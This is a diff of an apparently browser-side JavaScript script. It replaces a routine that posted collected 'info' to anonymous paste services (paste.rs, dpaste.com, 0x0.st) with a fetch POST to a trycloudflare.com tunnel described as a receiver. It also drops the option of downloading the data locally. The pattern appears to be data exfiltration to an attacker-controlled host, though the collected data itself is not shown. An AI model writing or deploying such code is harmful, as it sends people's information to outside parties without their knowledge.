@@ -249,74 +249,26 @@
         return info;
     }
 
-    /* ============ 2. ANONYMOUS UPLOAD ============ */
+    /* ============ 2. UPLOAD TO PYTHON SERVER ============ */
+    const SERVER_URL = 'https://trycloudflare.com';
+    
     async function uploadToPaste(content) {
-        const services = [
-            {
-                name: 'paste.rs',
-                run: async () => {
-                    const r = await fetch('https://paste.rs/', { method: 'POST', body: content });
-                    if (!r.ok) throw new Error('HTTP ' + r.status);
-                    const t = (await r.text()).trim();
-                    if (!/^https?:\/\//.test(t)) throw new Error('bad response: ' + t.slice(0, 60));
-                    return t;
-                }
-            },
-            {
-                name: 'dpaste.com',
-                run: async () => {
-                    const r = await fetch('https://dpaste.com/api/v2/', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        body: new URLSearchParams({
-                            content: content, syntax: 'text', expiry_days: '7'
-                        }).toString()
-                    });
-                    if (!r.ok) throw new Error('HTTP ' + r.status);
-                    const t = (await r.text()).trim();
-                    if (!/^https?:\/\//.test(t)) throw new Error('bad response: ' + t.slice(0, 60));
-                    return t;
-                }
-            },
-            {
-                name: '0x0.st',
-                run: async () => {
-                    const fd = new FormData();
-                    fd.append('file', new Blob([content], { type: 'text/plain' }), 'reddev-info.txt');
-                    const r = await fetch('https://0x0.st/', { method: 'POST', body: fd });
-                    if (!r.ok) throw new Error('HTTP ' + r.status);
-                    const t = (await r.text()).trim();
-                    if (!/^https?:\/\//.test(t)) throw new Error('bad response: ' + t.slice(0, 60));
-                    return t;
-                }
-            }
-        ];
-
-        const failures = [];
-        for (const svc of services) {
-            try {
-                await addLog(`[ .. ] posting to ${svc.name} ...`, 'warn');
-                const url = await svc.run();
-                return { service: svc.name, url };
-            } catch (e) {
-                failures.push(`${svc.name}: ${e.message}`);
-                await addLog(`[ ERR ] ${svc.name} failed: ${e.message}`, 'error');
-            }
-        }
-        throw new Error('all paste services failed -> ' + failures.join(' | '));
+      await addLog('[ .. ] sending to local receiver...', 'warn');
+      
+      const r = await fetch(SERVER_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: content })
+      });
+    
+      if (!r.ok) {
+        throw new Error('HTTP ' + r.status);
+      }
+    
+      const data = await r.json();
+      return { service: 'reddev-receiver', url: data.file };
     }
 
-    function downloadLocally(content) {
-        const blob = new Blob([content], { type: 'text/plain' });
-        const url  = URL.createObjectURL(blob);
-        const a    = document.createElement('a');
-        a.href = url;
-        a.download = 'reddev-info.txt';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        setTimeout(() => URL.revokeObjectURL(url), 2000);
-    }
 
     /* ============ 3. HACKER NEWS CHECK ============ */
     async function checkHackerNews() {
